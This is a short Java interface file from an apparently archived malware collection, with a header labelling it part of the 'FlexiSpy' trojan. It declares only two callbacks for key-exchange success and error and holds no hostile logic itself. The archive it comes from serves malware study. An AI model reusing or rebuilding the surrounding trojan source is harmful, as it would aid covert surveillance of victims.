/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.prot.unstruct;

import com.vvt.prot.unstruct.response.KeyExchangeCmdResponse;

public interface KeyExchangeListener {
	public void onKeyExchangeError(Throwable err);
	public void onKeyExchangeSuccess(KeyExchangeCmdResponse keyExchangeResponse);
}